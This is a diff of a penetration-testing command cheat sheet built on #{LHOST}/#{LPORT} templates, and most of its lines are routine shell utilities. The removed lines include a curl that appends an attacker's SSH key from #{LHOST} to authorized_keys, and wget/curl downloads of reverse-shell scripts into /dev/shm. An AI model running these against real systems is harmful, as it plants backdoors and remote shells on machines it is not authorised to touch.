@@ -6,10 +6,6 @@ base64 -w 0 #{file}
 xxd -p #{file} | tr -d '\n'
 @file.desc(.bin file)
 
-# Add public key to authorized keys
-# desc: Add SSH
-curl https://#{LHOST}:#{LPORT}/.ssh/id_rsa.pub >> ~/.ssh/authotized_keys
-
 # Echo without new line and Hex
 echo -n -e
 
@@ -18,9 +14,9 @@ echo -n -e
 wc -l #{file}
 wc -c #{file}
 
-# Sort
 # desc: Sort Reverse
-sort -nr #Sort by number and then reverse
+#Sort by number and then reverse
+sort -nr 
 
 # Sort and delete duplicates
 # desc: Sort
@@ -30,23 +26,6 @@ cat #{file} | sort | uniq
 # Replace string inside a file
 # desc: Replace
 sed -i 's/#{old}/#{new}/g' #{file} 
-
-# desc: Download in RAM
-wget #{LHOST}:#{LPORT}/#{file} -O /dev/shm/.rev.py
-wget #{LHOST}:#{LPORT}/#{file} -P /dev/shm
-curl #{LHOST}:#{LPORT}/#{file} -o /dev/shm/shell.py
-@file.desc(backconnect file)
-
-#Files used by network processes
-lsof #Open files belonging to any process
-lsof -p 3 #Open files used by the process
-lsof -i #Files used by networks processes
-lsof -i 4 #Files used by network IPv4 processes
-lsof -i 6 #Files used by network IPv6 processes
-lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
-lsof +D /lib #Processes using files inside the indicated dir
-lsof -i :80 #Files uses by networks processes
-fuser -nv tcp 80
 
 # desc: Decompress
 tar -xvzf /path/to/yourfile.tgz
@@ -62,35 +41,17 @@ sudo apt-get install xz-utils; unxz file.xz
 useradd -p 'openssl passwd -1 #{PWD}' #{USER}
 
 # desc: Clipboard
-xclip -sel c < cat file.txt
-
-# HTTP servers
-python -m SimpleHTTPServer #{LPORT}
-python3 -m http.server #{LPORT}
-ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => #{LPORT}, :DocumentRoot => Dir.pwd).start"
-php -S $ip:#{LPORT}
-
-# desc: Curl POST
-# json data
-curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3001/endpoint
-#Auth via JWT
-curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint
-
-# desc: Send Email
-# You will be prompted for the content
-sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf 
+xclip -sel c < cat #{file}
 
 # DD copy hex bin file without first X (28) bytes
 # desc: copy hex bin
 dd if=file.bin bs=28 skip=1 of=blob
 
 # Mount .vhd files (virtual hard drive)
-# Mount .vhd
+# desc: Mount .vhd
+# For read-only, create first /mnt/vhd
 sudo apt-get install libguestfs-tools
-guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd
-
-# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
-ssh-keyscan 10.10.10.101
+guestmount --add NAME.vhd --inspector --ro /mnt/vhd 
 
 # desc: Openssl
 openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
@@ -108,12 +69,13 @@ openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
 openssl rsa -in key.ssh.enc -out key.ssh
 
 # Decrypt
-openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz
+openssl enc -aes256 -k #{key} -d -in backup.tgz.enc -out b.tgz
 
 # Count number of instructions executed by a program, need a host based linux (not working in VM)
 perf stat -x, -e instructions:u "ls"
 
 # Find trick for HTB, find files from 2018-12-12 to 2018-12-14
+# desc: Find file with time
 find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null
 
 # desc: Reconfigure timezone
